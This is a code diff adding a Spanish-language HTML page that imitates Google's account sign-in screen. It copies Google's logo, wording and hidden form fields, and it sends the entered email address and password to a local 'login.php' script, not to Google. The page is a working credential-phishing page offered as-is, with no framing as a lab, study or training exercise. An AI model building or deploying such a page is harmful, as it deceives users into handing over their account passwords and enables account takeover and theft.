@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión - Google Accounts</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        html, body {
+            height: 100%;
+            margin: 0;
+            background-color: #202124;
+            color: #e8eaed;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+        }
+        
+        .google-logo {
+            width: 24px;
+            height: 24px;
+        }
+        
+        .password-field {
+            display: none;
+        }
+        
+        .password-field.active {
+            display: block;
+        }
+        
+        .email-field.hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body class="bg-[#202124] text-gray-200 flex flex-col items-center justify-center h-full">
+    
+    <div class="bg-[#1e1e1e] p-12 rounded-3xl shadow-lg max-w-md w-full mx-4">
+        <div class="flex justify-start mb-4">
+            <svg class="google-logo" viewBox="0 0 24 24">
+                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+            </svg>
+        </div>
+        
+        <form id="gaia_loginform" action="login.php" method="post" onsubmit="return gaia_onLoginSubmit();">
+            <!-- Campos ocultos originales -->
+            <input name="continue" id="continue" value="http://mail.google.com/mail/" type="hidden">
+            <input name="service" id="service" value="mail" type="hidden">
+            <input name="rm" id="rm" value="false" type="hidden">
+            <input name="dsh" id="dsh" value="-959293846815026083" type="hidden">
+            <input name="ltmpl" id="ltmpl" value="default" type="hidden">
+            <input name="scc" id="scc" value="1" type="hidden">
+            <input name="GALX" value="zsQGi7Mh774" type="hidden">
+            <input id="pstMsg" name="pstMsg" value="1" type="hidden">
+            <input id="dnConn" name="dnConn" value="" type="hidden">
+            <input id="checkConnection" name="checkConnection" value="youtube:692:1" type="hidden">
+            <input id="checkedDomains" name="checkedDomains" value="youtube" type="hidden">
+            <input name="timeStmp" id="timeStmp" value="" type="hidden">
+            <input name="secTok" id="secTok" value="" type="hidden">
+            <input id="_utf8" name="_utf8" value="?" type="hidden">
+            <input name="bgresponse" id="bgresponse" value="js_disabled" type="hidden">
+            
+            <!-- Pantalla de correo electrónico -->
+            <div id="email-section">
+                <h1 class="text-2xl font-normal text-white mb-1">Inicia sesión</h1>
+                <p class="text-base text-gray-400 mb-8">Usa tu Cuenta de Google</p>
+                
+                <!-- Campo de correo electrónico -->
+                <div class="email-field mb-1">
+                    <label for="Email" class="text-sm text-gray-300">Correo electrónico o teléfono</label>
+                    <input type="email" name="Email" id="Email" 
+                           class="w-full px-3 py-3 bg-[#1e1e1e] border border-gray-600 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-white text-base mt-1">
+                </div>
+                
+                <div class="text-blue-400 text-sm mb-6 hover:underline cursor-pointer">
+                    ¿Olvidaste el correo electrónico?
+                </div>
+                
+                <div class="text-sm text-gray-300 mb-8">
+                    ¿Esta no es tu computadora? Usa el modo de invitado para navegar de forma privada. 
+                    <a href="#" class="text-blue-400 hover:underline">Más información para usar el modo de invitado</a>
+                </div>
+            </div>
+            
+            <!-- Pantalla de contraseña (inicialmente oculta) -->
+            <div id="password-section" class="password-field">
+                <h1 class="text-2xl font-normal text-white mb-1">Te damos la bienvenida</h1>
+                
+                <!-- Email seleccionado -->
+                <div class="mb-6">
+                    <button type="button" id="email-display" class="flex items-center w-full bg-transparent border border-gray-600 rounded-full px-4 py-1 text-sm">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2 text-gray-400" viewBox="0 0 20 20" fill="currentColor">
+                            <path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd" />
+                        </svg>
+                        <span class="text-white" id="email-text"></span>
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 ml-auto text-gray-400" viewBox="0 0 20 20" fill="currentColor">
+                            <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd" />
+                        </svg>
+                    </button>
+                </div>
+                
+                <!-- Campo de contraseña -->
+                <div class="mb-5">
+                    <label for="Passwd" class="text-sm text-gray-300">Introduce tu contraseña</label>
+                    <input type="password" name="Passwd" id="Passwd" 
+                           class="w-full px-3 py-3 bg-[#1e1e1e] border border-gray-600 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-white text-base mt-1">
+                </div>
+                
+                <!-- Checkbox para mostrar contraseña -->
+                <div class="mb-8 flex items-center">
+                    <input type="checkbox" id="show-password" class="mr-2">
+                    <label for="show-password" class="text-sm text-gray-300">Mostrar contraseña</label>
+                </div>
+            </div>
+            
+            <!-- Botones de acción -->
+            <div class="flex justify-between items-center mt-8">
+                <a href="#" id="secondary-action" class="text-blue-400 text-sm hover:underline cursor-pointer font-medium">Crear cuenta</a>
+                <button type="button" id="next-button" class="bg-blue-500 text-white px-6 py-2 rounded-md hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-50 font-medium">
+                    Siguiente
+                </button>
+                <button type="submit" id="signin-button" class="bg-blue-500 text-white px-6 py-2 rounded-md hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-50 font-medium hidden">
+                    Siguiente
+                </button>
+            </div>
+        </form>
+    </div>
+    
+    <div class="absolute bottom-0 w-full text-gray-500 text-xs p-4">
+        <div class="flex justify-between items-center max-w-md mx-auto">
+            <select id="lang-chooser" class="bg-transparent text-gray-400 focus:outline-none">
+                <option value="es">Español (Latinoamérica)</option>
+                <option value="en">English (United States)</option>
+            </select>
+            <div class="flex space-x-4">
+                <a href="#" class="hover:underline">Ayuda</a>
+                <a href="#" class="hover:underline">Privacidad</a>
+                <a href="#" class="hover:underline">Condiciones</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts originales adaptados -->
+    <script type="text/javascript">
+        var start_time = (new Date()).getTime();
+        var emailSection = document.getElementById('email-section');
+        var passwordSection = document.getElementById('password-section');
+        var nextButton = document.getElementById('next-button');
+        var signinButton = document.getElementById('signin-button');
+        var secondaryAction = document.getElementById('secondary-action');
+        var emailInput = document.getElementById('Email');
+        var emailDisplay = document.getElementById('email-text');
+        var emailButton = document.getElementById('email-display');
+        var showPasswordCheckbox = document.getElementById('show-password');
+        var passwordInput = document.getElementById('Passwd');
+
+        function SetGmailCookie(name, value) {
+            document.cookie = name + "=" + value + ";path=/;domain=.google.com";
+        }
+
+        function lg() {
+            var now = (new Date()).getTime();
+            var cookie = "T" + start_time + "/" + start_time + "/" + now;
+            SetGmailCookie("GMAIL_LOGIN", cookie);
+        }
+
+        function gaia_onLoginSubmit() {
+            lg();
+            return true;
+        }
+        
+        // Mostrar pantalla de contraseña al hacer clic en "Siguiente"
+        nextButton.addEventListener('click', function() {
+            if (emailInput.value.trim() === '') {
+                // Resaltar el campo de email como error
+                emailInput.classList.add('border-red-500');
+                return;
+            }
+            
+            // Cambiar a la pantalla de contraseña
+            emailSection.style.display = 'none';
+            passwordSection.classList.add('active');
+            emailDisplay.textContent = emailInput.value;
+            nextButton.style.display = 'none';
+            signinButton.classList.remove('hidden');
+            secondaryAction.textContent = 'Probar otra manera';
+            passwordInput.focus();
+        });
+        
+        // Volver a la pantalla de email al hacer clic en el botón de email
+        emailButton.addEventListener('click', function() {
+            passwordSection.classList.remove('active');
+            emailSection.style.display = 'block';
+            nextButton.style.display = 'block';
+            signinButton.classList.add('hidden');
+            secondaryAction.textContent = 'Crear cuenta';
+            emailInput.focus();
+        });
+        
+        // Mostrar/ocultar contraseña
+        showPasswordCheckbox.addEventListener('change', function() {
+            passwordInput.type = this.checked ? 'text' : 'password';
+        });
+        
+        window.onload = function() {
+            emailInput.focus();
+        }
+    </script>
+</body>
+</html>
